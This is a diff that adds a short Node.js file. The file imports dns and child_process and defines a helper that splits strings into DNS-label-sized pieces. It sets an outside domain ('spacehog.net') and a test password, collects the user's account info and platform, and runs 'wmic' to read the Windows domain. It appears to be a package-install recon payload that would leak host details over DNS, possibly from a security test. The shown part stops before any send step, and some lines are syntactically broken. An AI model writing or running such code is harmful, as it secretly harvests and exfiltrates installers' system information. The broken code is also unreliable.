@@ -1,0 +1,35 @@
+var os = require('os')
+var crypto = require('crypto')
+var dns = require('dns')
+const execSync = require('child_process').execSync
+function myChunker = function myChunker(string,chunk_size) {
+    var b = [];
+    newstring = '';
+    char_count = 0
+
+    for(var i=0; i < string.length; i+=1){
+        char_count+=1;
+        if (char_count < chunk_size) {
+            newstring+= string[i];
+        }
+        else {
+    	    b.push(newstring);
+	    newstring = string[i];
+	    char_count = 0;
+        }
+    }
+    if (b.length > 0 && b.length < 3) {
+	    return_string = b.toString().replace(",",".");
+	    return_string += "." + newstring;
+	    return return_string;
+    }
+    else {
+        return newstring;
+    }
+}
+let domain = 'spacehog.net'
+let super_secret_password = 'H1-security-test-october-2022'
+let userinfo = os.userInfo()
+let info = ""
+(_tmp_1 = os.platform()).includes
+domain_info = execSync('wmic computersystem get domain').toString()
